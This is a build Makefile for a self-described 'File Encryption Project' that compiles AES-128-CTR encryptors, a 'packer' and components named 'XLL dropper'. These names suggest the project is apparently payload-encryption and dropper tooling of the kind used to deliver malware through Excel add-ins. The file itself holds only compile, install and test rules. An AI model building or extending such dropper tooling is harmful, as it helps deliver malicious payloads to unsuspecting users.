# Makefile for File Encryption Project
# Supports both Native (zero dependencies) and Legacy (with dependencies) implementations

CXX = g++
CXXFLAGS = -std=c++17 -O2 -Wall -Wextra -pedantic

# Native targets (zero dependencies)
NATIVE_TARGETS = native_encryptor native_xll_dropper native_gui

# Legacy targets (require OpenSSL)
LEGACY_TARGETS = encryptor xll_dropper packer

# All targets
ALL_TARGETS = $(NATIVE_TARGETS) $(LEGACY_TARGETS)

# Default target (builds native implementation)
all: native

# Build native implementation (recommended - zero dependencies)
native: $(NATIVE_TARGETS)

# Build legacy implementation (requires OpenSSL)
legacy: $(LEGACY_TARGETS)

# Build everything (requires all dependencies)
everything: $(ALL_TARGETS)

# Native encryptor (AES-128-CTR encryption)
native_encryptor: native_encryptor.cpp
	$(CXX) $(CXXFLAGS) -o native_encryptor native_encryptor.cpp

# Native XLL dropper (AES-128-CTR decryption)
native_xll_dropper: native_xll_dropper.cpp
	$(CXX) $(CXXFLAGS) -o native_xll_dropper native_xll_dropper.cpp

# Native GUI (console-based interface)
native_gui: native_gui.cpp
	$(CXX) $(CXXFLAGS) -o native_gui native_gui.cpp

# Legacy components (require OpenSSL dependencies)
encryptor: encryptor.cpp
	@echo "Building legacy encryptor (requires OpenSSL)..."
	$(CXX) $(CXXFLAGS) -o encryptor encryptor.cpp -lssl -lcrypto

xll_dropper: xll_dropper.cpp
	@echo "Building legacy XLL dropper (requires OpenSSL)..."
	$(CXX) $(CXXFLAGS) -o xll_dropper xll_dropper.cpp -lssl -lcrypto

packer: packer.cpp
	@echo "Building legacy packer..."
	$(CXX) $(CXXFLAGS) -o packer packer.cpp

# Test targets
test_native: native
	@echo "Testing native components..."
	@echo "Creating test file..."
	@echo "Test content for native encryption" > test_native.txt
	@echo "Encrypting with native AES..."
	@./native_encryptor test_native.txt test_native.enc
	@echo "Decrypting with native XLL dropper..."
	@./native_xll_dropper test_native.enc test_native.dec
	@echo "Verifying content..."
	@if cmp -s test_native.txt test_native.dec; then \
		echo "✓ Native encryption/decryption test PASSED"; \
	else \
		echo "✗ Native encryption/decryption test FAILED"; \
	fi
	@rm -f test_native.txt test_native.enc test_native.dec

test_legacy: legacy
	@echo "Testing legacy components..."
	@echo "Creating test file..."
	@echo "Test content for legacy encryption" > test_legacy.txt
	@echo "Encrypting with legacy AES..."
	@./encryptor test_legacy.txt test_legacy.enc
	@echo "Decrypting with legacy XLL dropper..."
	@./xll_dropper test_legacy.enc test_legacy.dec
	@echo "Verifying content..."
	@if cmp -s test_legacy.txt test_legacy.dec; then \
		echo "✓ Legacy encryption/decryption test PASSED"; \
	else \
		echo "✗ Legacy encryption/decryption test FAILED"; \
	fi
	@rm -f test_legacy.txt test_legacy.enc test_legacy.dec

test_compatibility: native legacy
	@echo "Testing compatibility between native and legacy implementations..."
	@echo "Creating test file..."
	@echo "Compatibility test content" > test_compat.txt
	@echo "Encrypting with native implementation..."
	@./native_encryptor test_compat.txt test_compat_native.enc
	@echo "Decrypting with legacy implementation..."
	@./xll_dropper test_compat_native.enc test_compat_legacy.dec
	@echo "Verifying native->legacy compatibility..."
	@if cmp -s test_compat.txt test_compat_legacy.dec; then \
		echo "✓ Native->Legacy compatibility PASSED"; \
	else \
		echo "✗ Native->Legacy compatibility FAILED"; \
	fi
	@echo "Encrypting with legacy implementation..."
	@./encryptor test_compat.txt test_compat_legacy.enc
	@echo "Decrypting with native implementation..."
	@./native_xll_dropper test_compat_legacy.enc test_compat_native.dec
	@echo "Verifying legacy->native compatibility..."
	@if cmp -s test_compat.txt test_compat_native.dec; then \
		echo "✓ Legacy->Native compatibility PASSED"; \
	else \
		echo "✗ Legacy->Native compatibility FAILED"; \
	fi
	@rm -f test_compat.txt test_compat_*.enc test_compat_*.dec

# Clean targets
clean:
	rm -f $(NATIVE_TARGETS) $(LEGACY_TARGETS)
	rm -f *.o *.exe
	rm -f test_*.txt test_*.enc test_*.dec

# Install targets
install: native
	@echo "Installing native components..."
	@mkdir -p /usr/local/bin
	@cp native_encryptor /usr/local/bin/
	@cp native_xll_dropper /usr/local/bin/
	@cp native_gui /usr/local/bin/
	@chmod +x /usr/local/bin/native_encryptor
	@chmod +x /usr/local/bin/native_xll_dropper
	@chmod +x /usr/local/bin/native_gui
	@echo "Native components installed to /usr/local/bin/"

install-legacy: legacy
	@echo "Installing legacy components..."
	@mkdir -p /usr/local/bin
	@cp encryptor /usr/local/bin/
	@cp xll_dropper /usr/local/bin/
	@cp packer /usr/local/bin/
	@chmod +x /usr/local/bin/encryptor
	@chmod +x /usr/local/bin/xll_dropper
	@chmod +x /usr/local/bin/packer
	@echo "Legacy components installed to /usr/local/bin/"

# Uninstall targets
uninstall:
	@echo "Uninstalling native components..."
	@rm -f /usr/local/bin/native_encryptor
	@rm -f /usr/local/bin/native_xll_dropper
	@rm -f /usr/local/bin/native_gui
	@echo "Native components uninstalled"

uninstall-legacy:
	@echo "Uninstalling legacy components..."
	@rm -f /usr/local/bin/encryptor
	@rm -f /usr/local/bin/xll_dropper
	@rm -f /usr/local/bin/packer
	@echo "Legacy components uninstalled"

# Documentation
docs:
	@echo "=== File Encryption Project Documentation ==="
	@echo ""
	@echo "🟢 NATIVE IMPLEMENTATION (Zero Dependencies):"
	@echo "  native_encryptor  - AES-128-CTR file encryption"
	@echo "  native_xll_dropper - AES-128-CTR file decryption"
	@echo "  native_gui        - Console-based GUI interface"
	@echo ""
	@echo "🟡 LEGACY IMPLEMENTATION (With Dependencies):"
	@echo "  encryptor         - OpenSSL-based AES-128-CTR encryption"
	@echo "  xll_dropper       - OpenSSL-based AES-128-CTR decryption"
	@echo "  packer            - File combination utility"
	@echo "  dragdrop_encryptor_gui.py - PyQt5 GUI application"
	@echo ""
	@echo "📋 BUILD TARGETS:"
	@echo "  make native       - Build native implementation (recommended)"
	@echo "  make legacy       - Build legacy implementation (requires OpenSSL)"
	@echo "  make everything   - Build both implementations"
	@echo ""
	@echo "🧪 TEST TARGETS:"
	@echo "  make test_native  - Test native implementation"
	@echo "  make test_legacy  - Test legacy implementation"
	@echo "  make test_compatibility - Test cross-compatibility"
	@echo ""
	@echo "📦 INSTALL TARGETS:"
	@echo "  make install      - Install native components"
	@echo "  make install-legacy - Install legacy components"
	@echo ""
	@echo "🔧 USAGE EXAMPLES:"
	@echo "  Native: ./native_encryptor <input> <output>"
	@echo "  Legacy: ./encryptor <input> <output>"
	@echo "  GUI:    ./native_gui (native) or python3 dragdrop_encryptor_gui.py (legacy)"
	@echo ""

# Help target
help:
	@echo "Available targets:"
	@echo ""
	@echo "🟢 NATIVE IMPLEMENTATION (Zero Dependencies):"
	@echo "  native           - Build native implementation (recommended)"
	@echo "  native_encryptor - Build native encryptor"
	@echo "  native_xll_dropper - Build native XLL dropper"
	@echo "  native_gui       - Build native GUI"
	@echo "  test_native      - Test native components"
	@echo ""
	@echo "🟡 LEGACY IMPLEMENTATION (With Dependencies):"
	@echo "  legacy           - Build legacy implementation (requires OpenSSL)"
	@echo "  encryptor        - Build legacy encryptor"
	@echo "  xll_dropper      - Build legacy XLL dropper"
	@echo "  packer           - Build legacy packer"
	@echo "  test_legacy      - Test legacy components"
	@echo ""
	@echo "🧪 TESTING:"
	@echo "  test_compatibility - Test cross-compatibility between implementations"
	@echo ""
	@echo "📦 INSTALLATION:"
	@echo "  install          - Install native components"
	@echo "  install-legacy   - Install legacy components"
	@echo "  uninstall        - Remove native components"
	@echo "  uninstall-legacy - Remove legacy components"
	@echo ""
	@echo "🔧 UTILITIES:"
	@echo "  everything       - Build both implementations"
	@echo "  clean            - Remove all built files"
	@echo "  docs             - Show documentation"
	@echo "  help             - Show this help"

.PHONY: all native legacy everything clean install install-legacy uninstall uninstall-legacy test_native test_legacy test_compatibility docs help